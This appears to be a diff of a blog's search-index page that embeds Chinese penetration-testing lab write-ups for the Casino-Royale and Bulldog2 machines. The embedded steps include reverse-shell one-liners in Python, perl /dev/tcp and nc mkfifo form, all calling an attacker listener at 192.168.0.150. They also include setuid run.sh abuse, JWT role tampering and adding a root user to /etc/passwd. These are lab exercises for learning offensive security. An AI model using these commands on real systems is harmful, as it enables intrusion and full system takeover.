+&lt;pre&gt;&lt;code&gt;echo &amp;quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;192.168.0.150\&amp;quot;,1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/bash\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&amp;quot; &amp;gt; casino-data-collection.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;监听开起来，然后就接收到了🤗&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;29&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126298435.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;而且是le用户的反弹shell&lt;/p&gt;
+&lt;h5 id=&#34;8提权&#34;&gt;8.提权&lt;/h5&gt;
+&lt;p&gt;可以看到mi6_detect_test文件为root所有，但所有用户都可执行，设置了&lt;font color=&#39;orange&#39;&gt;setuid标志位&lt;/font&gt;，setuid的作用是”让执行该命令的用户以该命令拥有者的权限去执行“&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-rwsr-sr-x 1 root root     8696 Feb 20  2019 mi6_detect_test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查看mi6_detect_test内容，发现是二进制程序&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;le@casino:/opt/casino-royale$ file mi6_detect_testfile mi6_detect_testmi6_detect_test: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3db71452bb888ddbd55d4427c51e23befd6b8c71, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那就strings查看一下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;30&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126314295.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;很明显看到有&lt;strong&gt;对run.sh进行调用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;而le有对这个文件修改的权限&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;那么目标就是在run.sh写入/bin/bash,这样mi6_detect_test执行时就获得了root权限的 shell&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;le@casino:/opt/casino-royale$ echo &#39;/bin/bash&#39; &amp;gt; run.shecho &#39;/bin/bash&#39; &amp;gt; run.shle@casino:/opt/casino-royale$ ./mi6_detect_test./mi6_detect_test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行后获得root权限的shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;31&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126323312.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;在/root/flag目录下发现flag.sh&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat flag.sh#!/bin/bash## Congrats!! Run this script for the flag!!#echo &amp;quot;--------------------------------------------&amp;quot;echo &amp;quot;--------------------------------------------&amp;quot;echo &amp;quot;Go here:   http://casino-royale.local:8082&amp;quot;echo &amp;quot;--------------------------------------------&amp;quot;echo &amp;quot;--------------------------------------------&amp;quot;cd /root/flag/;php -S 0.0.0.0:8082
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行flag.sh；访问8082端口&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;32&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629126335205.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
+&lt;p&gt;(1)靶机开放的每个端口有必要看看，这个实验靶机四个端口都有用到，并且后来还再搞一个端口🙃&lt;/p&gt;
+&lt;p&gt;(2)searchsploit是个不错的漏洞查找工具，提供在本地保存的存储库搜索漏洞的功能,虽然都是英文🙃遇到陌生网页框架，多搜搜，在seachsploit关键字找找，少走歪路。像这实验的pokermax poker league的admin用户更改漏洞和Snowfox CMS的注册漏洞都有前人的exploit&lt;/p&gt;
+&lt;p&gt;(3)这个实验将链接、解题关键都放在网页功能里，需要仔细查看&lt;/p&gt;
+&lt;p&gt;(4)stmp服务下用telnet向靶机发送邮件&lt;/p&gt;
+&lt;p&gt;(5)hydra爆破，终端用ftp登录（ftp 192.168.0.102），ftp传文件用put ./1.txt&lt;/p&gt;
+&lt;p&gt;(6)perl语言可调用system执行系统命令，可直接反弹shell（system(&amp;quot;bash -c &#39;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.150/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot;);）&lt;/p&gt;
+&lt;p&gt;(7)不同的所有者的shell因权限会受各种限制，www-data所能做的是有限才需要转为le用户，必须对文件所有者、文件执行权限、setuid标志有清楚认识，setuid标志位是成功提权的关键&lt;/p&gt;
+">内网渗透之Casino-Royale</a>
+      </div>
+      
+      <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog2/"" data-c="
           &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
 &lt;ol&gt;
@@ -1576,25 +1940,25 @@
 &lt;h2 id=&#34;二-实验步骤&#34;&gt;二、实验步骤&lt;/h2&gt;
 &lt;h4 id=&#34;1信息收集&#34;&gt;(1)信息收集&lt;/h4&gt;
 &lt;h5 id=&#34;1-主机发现&#34;&gt;1、主机发现&lt;/h5&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997897503.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125130606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;找到目标主机：192.168.0.101&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;h5 id=&#34;2端口扫描操作系统扫描&#34;&gt;2.端口扫描操作系统扫描&lt;/h5&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997907393.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125142020.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;为防止漏扫，多扫描几次，可发现主机80端口开放http服务，Linux操作系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h4 id=&#34;2web渗透&#34;&gt;(2)Web渗透&lt;/h4&gt;
 &lt;h5 id=&#34;1访问80端口&#34;&gt;1.访问80端口&lt;/h5&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997916629.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125159984.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;没有什么收获&lt;/p&gt;
 &lt;h5 id=&#34;2扫描目录&#34;&gt;2.扫描目录&lt;/h5&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997930403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125168354.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;目录下没什么收获&lt;/p&gt;
 &lt;p&gt;首页调用了四个js文件，突破口可能在js文件里&lt;/p&gt;
 &lt;p&gt;访问该靶机80端口，查看其js，保存本地并用网上js美化工具把代码美化一下😂&lt;/p&gt;
 &lt;h5 id=&#34;3审计js代码&#34;&gt;3.审计js代码&lt;/h5&gt;
 &lt;p&gt;拿到代码，联想到刚才首页注册不了，注册页面功能没有。查看”register“关键字，有所发现：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997941542.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
-&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997950791.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125177725.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125185501.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;根据 js定义，我们可以使用 post提交来实现注册，但是注意&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;em&gt;&lt;strong&gt;Content-Type必须要是：application/json 格式&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
@@ -1602,7 +1966,7 @@
 &lt;/ul&gt;
 &lt;h5 id=&#34;4伪造数据包&#34;&gt;4.伪造数据包&lt;/h5&gt;
 &lt;p&gt;我们打开burp，构造数据包，发送后注册成功&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997959204.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125193632.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;pre&gt;&lt;code&gt;{
 &amp;quot;name&amp;quot;: &amp;quot;linan&amp;quot;,
 
@@ -1615,30 +1979,30 @@
 }
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h5 id=&#34;5登陆&#34;&gt;5.登陆&lt;/h5&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997967431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125206673.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;登陆成功&lt;/p&gt;
 &lt;p&gt;查看登陆抓包，发现可疑tonken&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997979110.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125218766.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;h5 id=&#34;6解密tonken并修改&#34;&gt;6.解密tonken并修改&lt;/h5&gt;
 &lt;p&gt;6.1根据提示，jwt解密&lt;/p&gt;
 &lt;p&gt;网址：https://jwt.io&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997986624.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125229008.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;有一个payload的键值对，值是我们的用户信息，发现多一行&amp;quot;auth_level&amp;quot;: &amp;quot;standard_user&amp;quot;，凭字面意思应该是用户等级的标志，可能是以此来判断用户权限的，到js代码中找这个关键字。&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998000185.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125236285.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;pre&gt;&lt;code&gt;	if (&amp;quot;master_admin_user&amp;quot; == n.auth_level) return this.user = n, !0;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;6.2把&amp;quot;auth_level&amp;quot;: &amp;quot;&lt;font color=&#39;orange&#39;&gt;standard_user&lt;/font&gt;&amp;quot;替换&amp;quot;auth_level&amp;quot;: &amp;quot;&lt;font color=&#39;orange&#39;&gt;master_admin_user&lt;/font&gt;&amp;quot;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;{&amp;quot;success&amp;quot;:true,&amp;quot;token&amp;quot;:&amp;quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJsaW5hbiIsImVtYWlsIjoibGluYW5AcXEuY29tIiwidXNlcm5hbWUiOiJsaW5hbiIsImF1dGhfbGV2ZWwiOiJtYXN0ZXJfYWRtaW5fdXNlciJ9LCJpYXQiOjE2Mjg5NDc0MzQsImV4cCI6MTYyOTU1MjIzNH0.7N4Xj5dQuGWsv6iTWEyuXCWSsJcotzdX_EtM-uQEEhc&amp;quot;,&amp;quot;user&amp;quot;:{&amp;quot;name&amp;quot;:&amp;quot;linan&amp;quot;,&amp;quot;username&amp;quot;:&amp;quot;linan&amp;quot;,&amp;quot;email&amp;quot;:&amp;quot;linan@qq.com&amp;quot;,&amp;quot;auth_level&amp;quot;:&amp;quot;master_admin_user&amp;quot;}
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;拦截返回的&lt;font color=&#39;red&#39;&gt;response数据包&lt;/font&gt;，修改tonken值&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998010721.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998018553.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125245020.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125253375.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
 &lt;p&gt;发现页面右上角，已经变为admin&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998032726.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125263805.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;说明存在垂直越权漏洞&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;h5 id=&#34;7命令执行漏洞-反弹shell&#34;&gt;7.命令执行漏洞 反弹shell&lt;/h5&gt;
 &lt;p&gt;7.1&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998040511.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125273521.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;在GitHub上搜索Bulldog-2-The-Reckoning的代码，密码处存在命令执行漏洞&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;user.js
 router.post(&#39;/linkauthenticate&#39;, (req, res, next) =&amp;gt; {
@@ -1658,25 +2022,25 @@ router.post(&#39;/linkauthenticate&#39;, (req, res, next) =&amp;gt; {
 &lt;p&gt;命令：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.0.150 1234 &amp;gt;/tmp/f
 &lt;/code&gt;&lt;/pre&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998050487.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125283051.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;得到shell&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998163616.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125291331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;h5 id=&#34;8提权&#34;&gt;8.提权&lt;/h5&gt;
 &lt;p&gt;8.1进入/etc目录下，发现password文件的权限大得要命，意味着我们可以随意修改，写入一个管理员权限的用户&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998171414.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125301396.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;8.2可以仿照这个格式写入一个管理员权限的用户&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998180223.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125311329.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;strong&gt;使用加密命令，得到一个加密后的密码。设定123456为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等），如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。所以，加密盐其实是必须的参数。&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;perl -le &#39;print crypt(&amp;quot;123456&amp;quot;,&amp;quot;aa&amp;quot;)&#39;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;得到结果&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;18&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998187844.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;18&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125323459.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;8.3将linan这个用户写入passwd文件&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;echo &#39;linan:aaAN1ZUwjW7to:0:0:linan:/root:/bin/bash&#39; &amp;gt;&amp;gt; passwd
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;写入成功&lt;/p&gt;
 &lt;p&gt;8.4直接su/sudo不行，python调用一个新的本地终端，再来su，成功&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;19&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998197641.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;19&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629125334960.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
 &lt;p&gt;(1)js代码获取注册方法，POST方法传递application/json格式的注册信息&lt;/p&gt;
 &lt;p&gt;(2)token中jwt解密，更改权限，实现垂直越权漏洞&lt;/p&gt;
